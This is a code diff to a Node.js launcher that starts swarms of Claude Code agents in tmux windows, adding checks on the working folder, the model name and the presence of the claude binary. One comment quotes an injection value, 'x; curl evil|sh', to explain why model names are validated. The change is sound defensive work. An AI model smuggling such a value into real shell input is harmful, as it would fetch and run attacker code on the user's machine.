@@ -2,8 +2,9 @@
 
 // Conductor V2 fire control — turn a launch config into a running swarm.
 //
-//   plan(config)  — pure: resolve preset/topology into the exact agents, windows, briefings
-//                   and claude args that WOULD launch. The UI preview and the tests use this.
+//   plan(config)  — resolve preset/topology into the exact agents, windows, briefings and
+//                   claude args that WOULD launch (no tmux, no writes — it only stats the cwd).
+//                   The UI preview and the tests use this.
 //   fire(config)  — write the swarm directory + briefings, then launch one managed tmux
 //                   window per agent (via manage.run) and kick each off with a one-liner
 //                   pointing at its briefing file.
@@ -15,6 +16,7 @@
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
+const { spawnSync } = require('child_process');
 const manage = require('./manage');
 const topologies = require('./topologies');
 const presets = require('./presets');
@@ -31,7 +33,8 @@ function sanitizeSwarm(name) {
 }
 
 // Resolve a raw config ({ name, preset?, topology?, purpose?, agents?, cwd?, permissionMode? })
-// into a complete, validated launch plan. Pure — touches no tmux, writes no files.
+// into a complete, validated launch plan. Touches no tmux, writes no files (it does stat the cwd
+// so a bad folder is refused before fire() can strand a partial swarm).
 function plan(config = {}) {
   const preset = config.preset ? presets.get(config.preset) : null;
   const topoKey = config.topology || (preset && preset.topology) || 'hierarchical';
@@ -51,8 +54,14 @@ function plan(config = {}) {
 
   let cwd = String(config.cwd || '').trim() || HOME;
   cwd = cwd.replace(/^~(?=$|\/)/, HOME);
+  // A nonexistent cwd doesn't fail until manage.run's `tmux new-window -c` — mid-loop, stranding a
+  // partial swarm (some windows launched + kicked off, no rollback). Refuse up front instead.
+  if (!fs.existsSync(cwd) || !fs.statSync(cwd).isDirectory()) throw new Error(`cwd "${cwd}" does not exist or is not a directory`);
 
   const model = String(config.model || '').trim() || MODEL;
+  // model lands in `claude --model <x>` typed into a shell via send-keys — validate it like
+  // permissionMode above, or "x; curl evil|sh" rides the fire path straight into the pane.
+  if (!/^[A-Za-z0-9._-]+$/.test(model)) throw new Error(`invalid model "${model}" — letters, digits, dots, dashes and underscores only`);
 
   const dir = path.join(SWARMS_DIR, swarm);
   // Per-swarm message script (not the old shared one): it bakes in this swarm's member windows as
@@ -129,6 +138,14 @@ function fire(config, opts = {}) {
   const p = plan(config);
   if (!manage.hasTmux()) return { ok: false, error: 'tmux is not installed (brew install tmux).', plan: p };
 
+  // `claude` was a silent prereq: without it every window opens, types a command the shell can't
+  // find, and the swarm "launches" into N panes of `command not found`. Check the binary (or the
+  // test seam's cmd) resolves on PATH before creating anything.
+  const bin = String(opts.cmd || 'claude').trim().split(/\s+/)[0];
+  if (spawnSync('which', [bin], { encoding: 'utf8' }).status !== 0) {
+    return { ok: false, error: `\`${bin}\` is not on PATH — install the Claude Code CLI first (npm i -g @anthropic-ai/claude-code).`, plan: p };
+  }
+
   // Refuse to fire if ANY target window name is already a live tmux window — not just registry
   // entries. BUG-4: checking only listManaged() let a manually-created window of the same name slip
   // through, so manage.run() would fail mid-loop and leave a zombie partial swarm (some windows
@@ -145,7 +162,9 @@ function fire(config, opts = {}) {
     const r = manage.run(a.window, a.claudeArgs, p.cwd, {
       capture: false,
       cmd: opts.cmd, // test seam — defaults to 'claude' inside manage.run
-      meta: { swarm: p.swarm, role: a.role, slot: a.slot, topology: p.topology },
+      // kickoff is persisted so a LOST kickoff (window never wrote a transcript) can be
+      // re-delivered later — by /api/rekick from the board's "no transcript yet" card.
+      meta: { swarm: p.swarm, role: a.role, slot: a.slot, topology: p.topology, kickoff: a.kickoff },
     });
     // kickoff travels in the result so harnesses/watchdogs can re-deliver it to a stalled window.
     results.push({ window: a.window, role: a.role, kickoff: a.kickoff, initiator: !!a.initiator, ...r });
